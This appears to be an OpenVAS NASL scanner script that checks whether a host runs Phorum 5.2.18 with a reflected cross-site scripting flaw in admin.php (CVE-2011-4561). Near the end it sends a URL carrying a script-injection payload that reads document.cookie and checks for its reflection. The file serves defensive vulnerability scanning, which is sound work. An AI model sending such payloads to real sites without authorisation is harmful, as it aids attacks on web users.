###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phorum_admin_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Phorum 'admin.php' Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application";
tag_affected = "Phorum version 5.2.18";
tag_insight = "The flaw is due to an input appended to the URL after 'admin.php' is
  not properly sanitised before being returned to the user.";
tag_solution = "No solution or patch is available as of 02nd December, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.phorum.org/downloads.php";
tag_summary = "This host is running Phorum and is prone to cross-site scripting
  vulnerability.";

if(description)
{
  script_id(802530);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4561");
  script_bugtraq_id(49920);
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-02 17:46:36 +0530 (Fri, 02 Dec 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Phorum 'admin.php' Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/76026");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46282");
  script_xref(name : "URL" , value : "http://www.rul3z.de/advisories/SSCHADV2011-023.txt");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/519991/100/0/threaded");

  script_description(desc);
  script_summary("Check if Phorum is vulnerable to XSS attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("phorum_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Phorum Installed Location
if(!dir = get_dir_from_kb(port:port, app:"phorum")){
  exit(0);
}

## Path of Vulnerable Page
url = dir + '/admin.php/"><script>alert(document.cookie);</script></script>';

## Send XSS attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:"><script>alert\(document." +
                                               "cookie\);</script>")){
  security_warning(port);
}
